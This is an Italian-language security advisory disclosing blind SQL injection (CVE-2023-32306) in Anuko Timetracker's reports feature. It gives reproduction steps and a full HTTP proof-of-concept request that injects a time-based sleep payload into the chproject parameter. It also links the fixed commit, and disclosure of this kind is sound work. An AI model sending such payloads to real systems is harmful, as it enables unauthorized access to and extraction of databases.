## **Molteplici  Vulnerabilità di Blind SQL Injection nella funzionalità dei Reports in Anuko Timetracker (CVE-2023-32306)**

### Descrizione
La vulnerabilità di SQL Injection consente tipicamente ad un attaccante di estrarre l'intero database dal sito web vulnerabile, incluse le informazioni degli utenti, le password crittografate e i dati aziendali. Ciò può successivamente portare alla compromissione di massa degli account appartenenti agli utenti, alla crittografia dei dati e al loro riscatto o vendita a terze parti. Queste vulnerabilità di solito si verificano quando un'applicazione incorpora i dati degli utenti in una query al database in modo non sicuro. Qualsiasi attaccante può manipolare i dati in modo da eseguire la propria query al database, fino ad ottenere la possibilità di leggere o modificare i contenuti dello stesso.

In questo caso specifico, la vulnerabilità risulta impattare diversi parametri POST, tra cui `chstart`, `chproject`, `chfinish`, `chduration`, `chnote`, `chcost`, `chip` e `chtotalsonly`, in relazione alle funzionalità delle checkbox presenti durante la generazione e il salvataggio di un report su `timetracker/reports.php`.

### Requisiti
Dopo aver testato la PoC diverse volte, è stato possibile determinare che la vulnerabilità è sfruttabile solo se presente almeno un progetto all'interno della piattaforma.

### Steps-To-Reproduce
* Accedere alla piattaforma da `timetracker/login.php`.
* Raggiungere `timetracker/projects.php` e creare almeno un progetto, al fine di soddisfare il requisito descritto di cui sopra.
* Navigare quindi su `timetracker/reports.php` e, utilizzando un modello di report precedentemente generato o salvandone uno nuovo, specificare l'intervallo di tempo, selezionando utente, progetto e tutte le checkbox presenti sotto `Show fields` e infine raggruppandoli per data, utente e progetto.
* Attivare la funzionalità di intercettazione su un qualsiasi web application proxy. In questo PoC è stato utilizzato [Burp Suite](https://portswigger.net/burp).
* Intercettare la richiesta POST mentre viene selezionata l'opzione `Save` in fondo alla pagina, quindi inoltrare la richiesta al repeater.
* Scegliere uno dei parametri interessati menzionati nella descrizione del report corrente, come ad esempio `chproject`, e sostituire il suo contenuto con un payload di SQL Injection di tipo blind, che sia indifferentemente time o boolean-based. Per la PoC corrente, è stato utilizzato un payload di SQL injection time-based come `(select*from(select(sleep(10)))a)`.
* Inviando la richiesta, sarà possibile notare un ritardo di circa 10 secondi nel ricevere la risposta dall'applicazione. Per escludere un falso positivo, è possibile modificare i secondi di ritardo del database nel payload di SQL injection e inviare la richiesta più volte.

#### Note
Tutti i parametri POST menzionati sono da considerarsi come direttamente impattati poiché già testati manualmente ma, in via generale, si consiglia di proteggere anche altri parametri eventualmente presenti, nel caso in cui essi vengano utilizzati solo come risultato dell'abilitazione di alcuni plugin specifici.

### PoC
```
POST /timetracker/reports.php HTTP/1.1
Host: <REDACTED>
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 361
Origin: http://<REDACTED>
Connection: close
Referer: http://<REDACTED>/timetracker/reports.php
Cookie: tt_PHPSESSID=mm1eih01k11vv3m41vog4fntfe; tt_login=manager
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
DNT: 1
Sec-GPC: 1

favorite_report=-1&period=&start_date=2022-12-14&end_date=2022-12-22&users_active%5B%5D=1&project=1&approved=1&note_containing=a&chproject=(select*from(select(sleep(10)))a)&chstart=1&chfinish=1&chduration=1&chnote=1&chcost=1&chapproved=1&chip=1&group_by1=date&group_by2=user&group_by3=project&chtotalsonly=1&new_fav_report=test&btn_save=Save&fav_report_changed=
```

### Impatto
Un attaccante autenticato, indipendentemente dai privilegi, può interferire con le query che l'applicazione effettua verso il proprio database fino a leggere, modificare ed estrarre ogni tipo di dato dallo stesso.

### Riferimenti
* Report: https://huntr.dev/bounties/e0008246-4740-44d4-aef1-5b0c442c07e9/.
* Repository: https://huntr.dev/repos/anuko/timetracker.
* Fix: https://github.com/anuko/timetracker/commit/cd59a5694cee1b284ae66c895536438ae56d4147.

### Autore
[![Linkedin Badge](https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/samuele-gugliotta/)
[![Website Badge](https://img.shields.io/badge/website-000000?style=for-the-badge&logo=About.me&logoColor=white)](https://indevi0us.github.io)
